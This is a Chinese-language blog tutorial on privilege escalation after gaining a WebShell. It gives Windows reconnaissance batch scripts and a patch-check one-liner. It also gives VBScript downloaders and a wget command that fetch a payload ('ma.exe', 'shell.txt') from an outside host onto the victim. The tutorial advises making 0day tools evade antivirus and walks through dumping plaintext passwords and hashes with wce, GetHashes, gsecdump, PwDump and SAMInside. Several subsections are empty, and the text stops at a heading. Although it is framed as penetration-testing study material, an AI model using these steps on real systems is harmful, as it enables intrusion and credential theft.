---
title: 提权基础
date: 2017-09-19 17:24:27
id: 20170919172427
categories: 杂类问题
tags: 
	- 提权
---
<!-- more -->

# 提权基础

## 提权概述

在渗透测试过程中以获取系统最高权限为目标，首先通过寻找漏洞，获取WebShell权限，然后进行提权。提权是一个非常重要的过程，提权成功就意味着可以进行进一步的渗透测试。
### 提权简介

提权是随着互联网出现的一个概念，顾名思义，就是提升自己在服务器中的权限。提权的目的是获取系统的最高管理权限。例如，在Windows中时普通用户，通过提权获取了和Administrator一样的权限；在Linux中通过执行编译后的程序，从普通用户权限提升到root账号权限。

提权是黑客的专业名词，一般用在网站入侵和系统入侵中。最常见的是Linux和Windows下的提权。提权可以分为直接提权和简洁提权，也可分为本地提权和远程提权。

本地提权漏洞是指一个本来权限非常低、操作受限的用户，通过某种条件（例如，通过应用程序漏洞或者系统漏洞）直接提升到系统最高权限。远程提权是指黑客或攻击者通过漏洞利用程序，直接获取远程服务器的权限（在远程服务器上必须存在漏洞且未修补或者修补未成功）。

提权又分为操作系统提权与应用程序提权。

### 提权条件

提权不是在任何情况下都可以进行的，它有一定的前置条件，例如拥有内网普通用户权限、拥有WebShell、拥有FTP权限、拥有某些远程管理软件的账号和密码等，同时在本地或者远程服务器上存在相应的漏洞。当然，最重要的条件是拥有利用该漏洞的工具、代码或者程序。

### 提权准备工作

1. 目标服务器信息的收集

   利用已有权限或条件，对需要提权的目标服务器进行信息收集，例如在WebShell等的情况下执行命令获取Windows操作系统的信息。

   > 1. systeminfo：获取操作系统类型、版本、位数等信息。
   >
   > 2. ipconfig /all：获取是否为独立IP地址、DNS、计算机名称等信息。
   > 3. net user：当前用户信息。
   > 4. whoami：当前用户权限。
   > 5. netstat -an：当前端口开放情况

   收集系统信息的一个脚本程序

   ```shell
   @echo off
   echo ########system info collection
   systeminfo
   ver
   hostname
   net user
   net localgroup
   net localgroup administrators
   net user guest
   net user administrator
   echo ######at- with atq#####
   echo schtask /query
   echo
   echo ####task-list#########
   tasklist /svc
   echo
   echo ####net-work information
   ipconfig/all
   route print
   arp -a
   netstat -anipconfig /displaydns
   echo
   echo ######service#########
   sc query type= service state= all
   echo #######file-##########
   cd \
   tree -F
   ```

2. 准备提权服务器的漏洞补丁情况收集

   ```shell
   systeminfo>C:\Windows\Temp\temp.txt&
   (for %i in (KB977165 KB970483)
   do @type c:\Windows\Temp\temp.txt|@find /i "%i"|| @echo %i Not Installed!)
   &del /f /q /a c:\Windows\Temp\temp.txt
   ```

3. 准备提权0day及其他相关工具

   针对当前操作系统准备32位或64位提权0day。针对当前操作系统应用程序准备提权0day。准备获取密码的Hash工具，并对0day及其相关工具进行免杀处理和测试。

4. 寻找服务器可写目录

   在目标服务器中找到一个可写目录。

### 实施提权

1. 上传或下载提权0day和相关工具

   将文件上传到服务器有多种方法，例如通过WebShell、FTP、下载命令等将工具上传到系统的可写目录下。

   - 在Linux下，通过`wget http://www.antian365.com/shell.txt` 命令下载shell.txt文件到本地服务器。

   - 使用vbs下载，代码如下：


     ```vbscript
     iLocal =LCase(WScript.Arguments(1))
     iRemote = LCase(WScript.Arguments(0))
     Set xPost = CreateObject("Microsoft.XMLHTTP")
     xPost.Open("GET", iRemote, 0)
     xPost.Send()
     Set sGet = CreateObject("ADODB.Stream")
     sGet.Mode = 3
     sGet.Type = 1
     sGet.Open()
     sGet.Write(xPost.responseBody)
     sGet.SaveToFile(iLocal, 2)
     ```
     使用命令`cscript down .vbs http://www.antian365.com/ma.exe c:/ma.exe`， 将ma.exe保存到C盘根目录下，不写路径则会显示程序执行出错。

   - 固定下载程序位置和名称并下载，代码如下：

     ```
     url = "http://www.antian365.com/ma.exe"
     saves = "c:\ma.exe"
     Set xmlhttp = CreateObject("Microsoft.XMLHTTP")
     Set stream = CreateObject("ADODB.Stream")
     Call xmlhttp.open("GET", url, False)
     Call xmlhttp.send()
     stream.mode =3
     stream.type = 1
     Call stream.open()
     Call stream.write(xmlhttp.responsebody)
     Call stream.savetofile(saveas, 2)
     Set xmlhttp = Nothing
     Set stream = Nothing

     ```

     将以上代码保存为down.vbs文件，执行`cscript down.vbs` 命令即可下载程序ma.exe到C盘中。

   - 另外一种下载文件的方法，代码如下。

   - 使用bitsadmin命令下载文件。

   - 在bat模式下执行vbs下载，代码如下。

   - 在FTP命令模式下下载。down.bat内容如下。

2. 执行0dya进行提权尝试

   在WebShell状态下执行提权0day。通常通过0day添加普通用户为管理员，或者通过0day执行其他可执行程序（例如木马、系统密码获取工具等）。

3. 获取系统权限及操作系统的密码

   使用密码获取软件获取操作系统的密码。例如，使用`wce -w` 命令获取Windows系统当前登录的铭文密码，使用`cat /etc/shadow` 命令获取Linux操作系统Shadow文件的内容。

## Windows账号和密码的获取与破解

Windows账号和密码的获取主要针对了系统权限的情况，尤其是3389登陆的情况（远程桌面登陆）。

### 使用GetHashes获取Windows系统密码的Hash值

命令格式

`GetHashes <sam registry file> [System key file]` 或 `GetHashes $Local`

使用`GetHashes $Local`获取系统密码Hash值，仅在system权限下成功。

使用时，将其复制到欲获取密码Hash值得系统盘中，然后执行`getpw $local`（可将GetHashes改名）。

> 注意：
>
> 1. 在使用GetHashes获取密码时，必须有system权限，也就是要在反弹Shell和Telnet下获取。
> 2. GetHashes由于威力巨大，绝大多数杀毒软件已将GetHashes加入病毒库。

### 使用gsecdump获取Windows系统密码

下载方式：发邮件给info@truesec.co索取。

该命令参数：

```
-h /:显示帮助信息
-a /：获取所有密码信息
-s /：从SAM和域控中获取Hash值
-l /：获取LSA信息，基本没用
-u /：获取活动的登陆Hash值，即当前登录用户的Hash值
-w /：获取无线密码
-S /：强制评估版本为系统版本
```

通常使用`-a` 和`-u`来获得所有或当前用户的密码。

### 使用PwDump获取域控密码

PwDump可以抓取Windows平台上多种类型的用户凭据，包括本地账户、域账户、缓存的域账户和Bitlocker。

```
Local accounts NT/LM hashes + history:本机NT/LM Hash和历史登录记录。
Domain accounts NT/LM hashes + history:域中的NT/lm Hash和历史登录记录。
Cached domain password：缓存中的域管理密码。
Bitlocaker recovery information（recovery passwords & key packages）：使用Bitlocker恢复后遗留的信息。
```

PwDump必须在Dos命令提示符下运行。参数有：

```
-dhl:导出本地Hash值。
-dhdc：导出内存中的域控Hash值。
-dhd：导出域控Hash值，必须指定NTDS文件。
-db：导出Bitlocker信息，必须制定NTDS文件。
-nt：导出ntds文件。
-hist：导出历史信息，可选项。
-t：导出类型。可选项，默认导出John类型。
-o：导出文件到本地。
```

该命令还可以配合Ntdsutil工具导出域控密码。

### 使用PwDump获取系统账号和密码

通过一些一处程序成功溢出被攻击计算机后，最重要一步就是获取该计算机中的用户账号和密码。然后远程 登录3389远程桌面。

> 一次实例：
>
> 1. 上传文件到欲获取密码的计算机中
>
> PwDump4.02版本中有两个文件：一个是Pwd4.dll，另外一个是Pwdump4.exe（在早期版本中，其DLL文件为lsaext.dll）。将这两个文件上传到欲获取账号和密码的计算机的系统目录下。
>
> 2. 在Shell中执行获取密码的命令
>
>    本案例通过Radmin（远程桌面系统）的Telnet来执行命令。到系统根目录中执行`pwd4 /l /o:*.*.*.82.sam`命令（将Pwdump4.exe改名为pwd4.exe），将系统中的账号和密码信息导出到`*.*.*.82.sam`文件。导出成功后，会给出提示信息，如操作系统版本情况及有多少个用户等，然后将其sam文件传输回本地计算机。（/l导出到本地。/o:filename输出到filename文件。

### 使用SAMInside获取及破解Windows系统密码

SAMInside可以获取包括Windows Server 2008以下版本操作系统的用户密码Hash值。获取Hash值后，可通过彩虹表或字典等进行破解，进而获取系统的密码。

选择`Import Local User via Scheduler`可以将本地用户的Hash值导出。导入时，必须有管理员权限。导出系统用户密码hash值成一份文件后，可将该文件导入Ophcrack中进行破解。

### 使用oclHashcat破解Windows系统账号密码
